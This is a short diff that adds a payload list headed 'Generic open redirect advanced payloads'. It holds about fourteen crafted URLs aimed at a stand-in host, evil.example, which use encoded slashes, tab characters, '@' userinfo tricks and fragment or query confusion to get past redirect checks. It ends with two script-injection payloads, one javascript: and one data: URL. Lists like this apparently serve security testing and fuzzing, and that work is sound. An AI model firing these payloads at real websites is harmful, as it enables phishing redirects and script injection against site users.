@@ -1,0 +1,16 @@
+# Generic open redirect advanced payloads
+//evil.example
+https://evil.example
+http://evil.example
+////evil.example
+///evil.example/%2f..
+/%5cevil.example
+https://example.com.evil.example
+https://example.com@evil.example
+https://evil.example#example.com
+https://evil.example?example.com
+//%2fevil.example
+/%09/evil.example
+/%2e%2e//evil.example
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
